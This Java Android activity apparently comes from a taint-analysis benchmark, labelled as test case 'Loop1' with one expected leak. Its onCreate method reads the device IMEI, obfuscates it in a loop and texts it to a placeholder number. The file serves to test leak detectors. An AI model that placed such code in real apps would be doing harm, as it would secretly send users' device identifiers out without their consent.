package xx.xxx;

import xx.xxx.R;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
/**
 * @testcase_name Loop1
 * @version 0.1
 * 
 * @description tainted data is created and sent to a sink after it was transformed in a loop.
 * @dataflow source -> imei -> obfuscated -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle standard java constructs
 */
public class LoopExample1 extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loop_example1);
        
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		String imei = telephonyManager.getDeviceId(); //source
		
		String obfuscated = "";
		for(char c : imei.toCharArray())
			obfuscated += c + "_";
		
		SmsManager sm = SmsManager.getDefault();

		sm.sendTextMessage("+49 1234", null, obfuscated, null, null); //sink, leak
    }    
}
